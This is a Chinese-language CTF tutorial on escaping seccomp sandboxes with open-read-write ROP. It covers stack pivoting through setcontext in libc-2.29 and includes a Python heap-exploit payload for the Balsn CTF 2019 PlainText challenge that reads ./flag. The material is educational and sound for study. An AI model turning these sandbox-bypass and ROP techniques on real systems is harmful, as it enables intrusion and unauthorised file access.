# C 沙盒逃逸
## orw

有些時候 pwn 題目中爲了增加難度，會使用類似 [seccomp](https://en.wikipedia.org/wiki/Seccomp) 的函數來禁用一部分系統調用，往往會把 execve 這種系統調用禁用掉，基本上拿 shell 是不可能了，但是我們 pwn 題是面向 flag 的，所以還是可以通過 orw（ open-read-write ）的方法來讀出 flag 的。在棧上的 orw 和 普通 rop 其實沒有什麼特別大的區別，這裏主要談一談堆利用中的白名單繞過。

一般來說，開啓了白名單的堆利用類題，我們會在劫持了某鉤子函數如 __free_hook 或 got 表之後考慮實現 orw，這個時候我們只可以注入一個 gadget，一般來說我們希望這個 gadget 能夠實現棧遷移，一種比較通用的做法是利用 setcontext 函數，其在 libc-2.29 中實現爲

```
.text:0000000000055E00 ; __unwind {
.text:0000000000055E00                 push    rdi
.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset
.text:0000000000055E08                 xor     edx, edx        ; oset
.text:0000000000055E0A                 mov     edi, 2          ; how
.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize
.text:0000000000055E15                 mov     eax, 0Eh
.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask
.text:0000000000055E1C                 pop     rdx
.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000055E23                 jnb     short loc_55E80
.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
.text:0000000000055E2C                 fldenv  byte ptr [rcx]
.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E76 ; } // starts at 55E00
```

當然其他版本也大同小異，可見在這個函數中有對 rsp 的賦值，如果我們可以控制 rdx，就可以控制 rsp 實現棧遷移了。

### 例題
#### Balsn_CTF_2019-PlainText
##### 分析
在 orw 之前的利用這裏不再贅述，請見《Glibc Heap 利用》目錄下的《堆中的 Off-By-One》中對此題的分析

比較討厭的是，在 libc-2.29 下，free 函數不會再將 rdi 賦值給 rdx，我們無法直接控制 rdx，僅能控制 rdi，幸好比較巧合的，在本題的 libc 中有這樣一個 gadget

```
0x12be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
```

通過使用這個 gadget 之後改變 rdx，ret 到 setcontext 之後就可以 rop 了（這個 chunk 無法通過 ROPgadget 找出，需要使用 ropper）。
##### exploit
這裏只給出 payload
```python
## alloc to __free_hook ##
magic_gadget = libc_base + 0x12be97
add(0x28,p64(magic_gadget)) # 73

pop_rdi_ret = libc_base + 0x26542
pop_rsi_ret = libc_base + 0x26f9e
pop_rdx_ret = libc_base + 0x12bda6
syscall_ret = libc_base + 0xcf6c5
pop_rax_ret = libc_base + 0x47cf8
ret = libc_base + 0xc18ff

payload_addr = heap_base + 0x270
str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
rw_addr = heap_base 

payload = p64(libc_base + 0x55E35) # rax
payload += p64(payload_addr - 0xA0 + 0x10) # rdx
payload += p64(payload_addr + 0x28)
payload += p64(ret)
payload += ''.ljust(0x8,'\x00')

rop_chain = ''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["write"])

payload += rop_chain
payload += './flag\x00'
add(len(payload) + 0x10,payload) # 74
#gdb.attach(proc.pidof(sh)[0])
delete(74)

sh.interactive()
```
